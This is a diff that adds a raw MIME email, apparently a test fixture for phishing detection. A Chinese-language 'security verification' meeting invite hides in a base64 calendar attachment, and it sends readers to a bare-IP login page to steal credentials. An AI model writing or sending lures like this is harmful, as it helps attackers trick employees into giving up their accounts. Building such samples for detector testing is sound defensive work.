@@ -1,0 +1,19 @@
+From: =?utf-8?B?5rWL6K+V5pSv5oyB?= <it-support@partner.example>
+To: employee@corp.internal
+Date: Thu, 13 Aug 2026 10:00:00 +0800
+Message-ID: <ev50@partner.example>
+Subject: 会议邀请：安全验证
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+您好，请接受会议邀请完成安全验证。--BS
+Content-Type: text/calendar
+Content-Disposition: attachment; filename="verify.ics"
+Content-Transfer-Encoding: base64
+
+QkVHSU46VkNBTEVOREFSDQpWRVJTSU9OOjIuMA0KQkVHSU46VkVWRU5UDQpTVU1NQVJZOumCrueusei0puaIt+WuieWFqOmqjOivge+8iDI05bCP5pe25YaF77yJDQpPUkdBTklaRVI6bWFpbHRvOml0LXN1cHBvcnRAcGFydG5lci5leGFtcGxlDQpVUkw6aHR0cDovLzIwMy4wLjExMy42MC92ZXJpZnkvbG9naW4NCkRFU0NSSVBUSU9OOuaCqOeahOi0puaIt+WtmOWcqOW8guW4uOeZu+W9le+8jOivt+eCueWHu+mTvuaOpeWujOaIkOmqjOivgQ0KRU5EOlZFVkVOVA0KRU5EOlZDQUxFTkRBUg0K
+--BS--
+
